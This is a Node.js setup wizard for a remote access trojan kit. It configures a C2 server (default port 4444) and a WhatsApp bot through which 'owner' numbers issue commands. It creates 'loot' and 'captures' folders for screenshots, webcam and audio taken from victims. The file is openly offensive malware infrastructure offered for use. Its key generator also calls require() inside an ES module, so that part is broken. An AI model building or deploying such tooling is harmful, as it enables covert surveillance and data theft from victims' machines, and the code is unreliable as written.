#!/usr/bin/env node

/**
 * T0OL-B4S3-263 Setup Wizard
 * Modern interactive installer with hacker aesthetic
 */

import fs from 'fs';
import path from 'path';
import readline from 'readline';
import { fileURLToPath } from 'url';
import chalk from 'chalk';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const projectRoot = path.join(__dirname, '..');

// ═══════════════════════════════════════════════════════════════
// COLORS & STYLING
// ═══════════════════════════════════════════════════════════════

const colors = {
  primary: (text) => chalk.hex('#00FF00')(text),
  secondary: (text) => chalk.hex('#00CCFF')(text),
  danger: (text) => chalk.hex('#FF0033')(text),
  warning: (text) => chalk.hex('#FFAA00')(text),
  success: (text) => chalk.hex('#00FF00')(text),
  header: (text) => chalk.bold.hex('#00FF00')(text),
  dim: chalk.dim,
};

// ═══════════════════════════════════════════════════════════════
// READLINE INTERFACE
// ═══════════════════════════════════════════════════════════════

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  terminal: true,
});

function prompt(question, defaultValue = '') {
  return new Promise((resolve) => {
    const displayQuestion = defaultValue
      ? `${colors.secondary(question)} ${colors.dim(`[${defaultValue}]`)}: `
      : `${colors.secondary(question)}: `;

    rl.question(displayQuestion, (answer) => {
      resolve(answer || defaultValue);
    });
  });
}

function showLine() {
  console.log(colors.primary('═'.repeat(80)));
}

function showBanner() {
  console.clear();
  console.log(colors.header(`
╔════════════════════════════════════════════════════════════════════════╗
║                                                                        ║
║                   T0OL-B4S3-263 SETUP WIZARD v1.0                     ║
║                    Modern Hacker Aesthetic Edition                    ║
║                                                                        ║
╚════════════════════════════════════════════════════════════════════════╝
  `));
}

function showSection(title) {
  showLine();
  console.log(colors.header(`▶ ${title}`));
  showLine();
}

async function wait(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// ═══════════════════════════════════════════════════════════════
// MAIN SETUP FLOW
// ═══════════════════════════════════════════════════════════════

async function runSetup() {
  showBanner();

  console.log(colors.secondary(`
Welcome, ${colors.primary('H4CK3R')}.

This wizard will configure T0OL-B4S3-263 for your system.
Answer the following questions to get started.
  `));

  await wait(1500);

  // ═══════════════════════════════════════════════════════════════
  // STEP 1: RAT Server Configuration
  // ═══════════════════════════════════════════════════════════════

  showSection('STEP 1: RAT C2 SERVER CONFIGURATION');

  const ratHost = await prompt(
    'RAT Server Host (C2 listening address)',
    '127.0.0.1'
  );
  const ratPort = await prompt(
    'RAT Server Port (listening port)',
    '4444'
  );
  const encryptionKey = await prompt(
    `Encryption Key (leave blank to generate)`,
    ''
  );

  let finalEncryptionKey = encryptionKey;
  if (!finalEncryptionKey) {
    finalEncryptionKey = generateEncryptionKey();
    console.log(colors.success(`\n✓ Generated encryption key: ${finalEncryptionKey}`));
  }

  // ═══════════════════════════════════════════════════════════════
  // STEP 2: WhatsApp Configuration
  // ═══════════════════════════════════════════════════════════════

  showSection('STEP 2: WHATSAPP BOT CONFIGURATION');

  const botName = await prompt(
    'Bot Display Name',
    'T0OL-B4S3-263 C2'
  );

  const commandPrefix = await prompt(
    'Command Prefix (single character)',
    '/'
  );

  console.log(colors.secondary('\n⚠ Owner Numbers: WhatsApp numbers authorized to use this bot'));
  console.log(colors.dim('Format: 1234567890@s.whatsapp.net (without + prefix)'));
  console.log(colors.dim('Example: 447911123456@s.whatsapp.net'));

  let ownerNumbers = [];
  let addingNumbers = true;

  while (addingNumbers) {
    const number = await prompt(
      'Enter WhatsApp number (or press Enter to finish)'
    );

    if (!number) {
      if (ownerNumbers.length === 0) {
        console.log(colors.warning('⚠ You must add at least one owner number!'));
        continue;
      }
      addingNumbers = false;
    } else {
      let formattedNumber = number.replace(/\D/g, '');

      if (!formattedNumber.endsWith('@s.whatsapp.net')) {
        formattedNumber += '@s.whatsapp.net';
      }

      ownerNumbers.push(formattedNumber);
      console.log(colors.success(`✓ Added: ${formattedNumber}`));
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // STEP 3: Session & Features
  // ═══════════════════════════════════════════════════════════════

  showSection('STEP 3: FEATURES & BEHAVIOR');

  const autoSaveMedia = await prompt(
    'Auto-save media files (screenshots, audio)? (yes/no)',
    'yes'
  );

  const commandTimeout = await prompt(
    'Default command timeout (milliseconds)',
    '60000'
  );

  const enableNotifications = await prompt(
    'Enable completion notifications? (yes/no)',
    'yes'
  );

  // ═══════════════════════════════════════════════════════════════
  // STEP 4: Review & Confirm
  // ═══════════════════════════════════════════════════════════════

  showSection('STEP 4: REVIEW CONFIGURATION');

  const config = {
    ratServer: {
      host: ratHost,
      port: parseInt(ratPort),
      encryptionKey: finalEncryptionKey,
      apiPort: 5000,
    },
    whatsapp: {
      botName: botName,
      prefix: commandPrefix,
      ownerNumbers: ownerNumbers,
    },
    features: {
      autoSaveMedia: autoSaveMedia.toLowerCase() === 'yes',
      maxCommandTimeout: parseInt(commandTimeout),
      enableNotifications: enableNotifications.toLowerCase() === 'yes',
    },
  };

  console.log(colors.primary('\n📋 CONFIGURATION SUMMARY:\n'));
  console.log(colors.secondary('RAT Server:'));
  console.log(`  Host: ${colors.primary(config.ratServer.host)}`);
  console.log(`  Port: ${colors.primary(config.ratServer.port)}`);
  console.log(`  Key: ${colors.dim(config.ratServer.encryptionKey.substring(0, 20) + '...')}`);

  console.log(colors.secondary('\nWhatsApp Bot:'));
  console.log(`  Name: ${colors.primary(config.whatsapp.botName)}`);
  console.log(`  Prefix: ${colors.primary(config.whatsapp.prefix)}`);
  console.log(`  Owners: ${colors.primary(config.whatsapp.ownerNumbers.length)} number(s)`);
  config.whatsapp.ownerNumbers.forEach((num) => {
    console.log(`    • ${colors.dim(num)}`);
  });

  console.log(colors.secondary('\nFeatures:'));
  console.log(`  Auto-save: ${config.features.autoSaveMedia ? colors.success('✓') : '✗'}`);
  console.log(`  Notifications: ${config.features.enableNotifications ? colors.success('✓') : '✗'}`);
  console.log(`  Timeout: ${colors.primary(config.features.maxCommandTimeout + 'ms')}`);

  const confirm = await prompt(
    '\nProceed with this configuration?',
    'yes'
  );

  if (confirm.toLowerCase() !== 'yes') {
    console.log(colors.danger('\n✗ Setup cancelled.'));
    rl.close();
    process.exit(0);
  }

  // ═══════════════════════════════════════════════════════════════
  // STEP 5: Write Configuration
  // ═══════════════════════════════════════════════════════════════

  showSection('STEP 5: WRITING CONFIGURATION');

  try {
    // Write config.json
    const configPath = path.join(projectRoot, 'config.json');
    fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
    console.log(colors.success(`✓ Created: ${path.relative(process.cwd(), configPath)}`));

    // Write .env file
    const envContent = `# T0OL-B4S3-263 Environment Configuration
# Generated by setup wizard

# RAT Server Configuration
RAT_SERVER_HOST=${config.ratServer.host}
RAT_SERVER_PORT=${config.ratServer.port}
ENCRYPTION_KEY=${config.ratServer.encryptionKey}
RAT_API_PORT=${config.ratServer.apiPort}

# WhatsApp Bot Configuration
BOT_NAME="${config.whatsapp.botName}"
COMMAND_PREFIX="${config.whatsapp.prefix}"
OWNER_NUMBERS=${JSON.stringify(config.whatsapp.ownerNumbers)}

# Feature Flags
AUTO_SAVE_MEDIA=${config.features.autoSaveMedia}
MAX_COMMAND_TIMEOUT=${config.features.maxCommandTimeout}
ENABLE_NOTIFICATIONS=${config.features.enableNotifications}

# Session Storage
SESSION_DIR=./whatsapp-c2/sessions
LOOT_DIR=./loot
CAPTURES_DIR=./captures
`;

    const envPath = path.join(projectRoot, '.env');
    fs.writeFileSync(envPath, envContent);
    console.log(colors.success(`✓ Created: ${path.relative(process.cwd(), envPath)}`));

    // Create .env.example
    fs.writeFileSync(
      path.join(projectRoot, '.env.example'),
      envContent.replace(/=.+/g, '=YOUR_VALUE_HERE')
    );
    console.log(colors.success(`✓ Created: .env.example (template)`));

  } catch (error) {
    console.log(colors.danger(`\n✗ Error writing configuration: ${error.message}`));
    rl.close();
    process.exit(1);
  }

  // ═══════════════════════════════════════════════════════════════
  // STEP 6: Verify Installation
  // ═══════════════════════════════════════════════════════════════

  showSection('STEP 6: VERIFYING INSTALLATION');

  try {
    const botPath = path.join(projectRoot, 'bot.js');
    const hasBot = fs.existsSync(botPath);
    console.log(colors.success(hasBot ? '✓' : '✗') + ` Bot file: ${botPath}`);

    const sessionDir = path.join(projectRoot, 'sessions');
    if (!fs.existsSync(sessionDir)) {
      fs.mkdirSync(sessionDir, { recursive: true });
      console.log(colors.success('✓') + ` Created: sessions directory`);
    } else {
      console.log(colors.success('✓') + ` Sessions directory exists`);
    }

    const lootDir = path.join(projectRoot, 'loot');
    if (!fs.existsSync(lootDir)) {
      fs.mkdirSync(lootDir, { recursive: true });
      console.log(colors.success('✓') + ` Created: loot directory`);
    } else {
      console.log(colors.success('✓') + ` Loot directory exists`);
    }

    const capturesDir = path.join(projectRoot, 'captures');
    if (!fs.existsSync(capturesDir)) {
      fs.mkdirSync(capturesDir, { recursive: true });
      fs.mkdirSync(path.join(capturesDir, 'screenshots'), { recursive: true });
      fs.mkdirSync(path.join(capturesDir, 'webcam'), { recursive: true });
      fs.mkdirSync(path.join(capturesDir, 'audio'), { recursive: true });
      console.log(colors.success('✓') + ` Created: captures directory with subdirs`);
    } else {
      console.log(colors.success('✓') + ` Captures directory exists`);
    }

  } catch (error) {
    console.log(colors.warning(`⚠ Warning during verification: ${error.message}`));
  }

  // ═══════════════════════════════════════════════════════════════
  // FINAL: Success & Next Steps
  // ═══════════════════════════════════════════════════════════════

  showSection('SETUP COMPLETE ✓');

  console.log(colors.success(`
╔════════════════════════════════════════════════════════════════════════╗
║                      SETUP SUCCESSFUL!                                ║
╚════════════════════════════════════════════════════════════════════════╝
  `));

  console.log(colors.primary('\n📋 Next Steps:\n'));
  console.log(`1. ${colors.secondary('Install Node dependencies:')}`);
  console.log(`   ${colors.dim('cd whatsapp-c2 && npm install')}`);

  console.log(`\n2. ${colors.secondary('Start the bot:')}`);
  console.log(`   ${colors.dim('npm start')}`);

  console.log(`\n3. ${colors.secondary('Scan QR code with WhatsApp')} on your authorized phone`);

  console.log(`\n4. ${colors.secondary('Send')}: ${colors.primary('/help')}`);
  console.log(`   ${colors.dim('Bot will respond with command menu')}`);

  console.log(colors.primary('\n📁 Configuration Files:\n'));
  console.log(`• config.json - Main configuration (machine-readable)`);
  console.log(`• .env - Environment variables (for deployment)`);
  console.log(`• .env.example - Template for reference`);

  console.log(colors.warning(`\n⚠️  IMPORTANT:\n`));
  console.log(`✓ Keep ${colors.primary('config.json')} and ${colors.primary('.env')} secret!`);
  console.log(`✓ Change ${colors.primary('OWNER_NUMBERS')} after deployment`);
  console.log(`✓ Use strong encryption keys for production`);
  console.log(`✓ Run on secure, isolated network only`);

  console.log(colors.primary(`\nHappy ${colors.danger('H4CK1NG')}! 🎯\n`));

  rl.close();
  process.exit(0);
}

// ═══════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════

function generateEncryptionKey() {
  // Generate a Fernet-compatible encryption key
  const crypto = require('crypto');
  const key = crypto.randomBytes(32);
  return key.toString('base64').substring(0, 44);
}

// ═══════════════════════════════════════════════════════════════
// RUN SETUP
// ═══════════════════════════════════════════════════════════════

runSetup().catch((error) => {
  console.error(colors.danger(`\n✗ Setup failed: ${error.message}`));
  rl.close();
  process.exit(1);
});
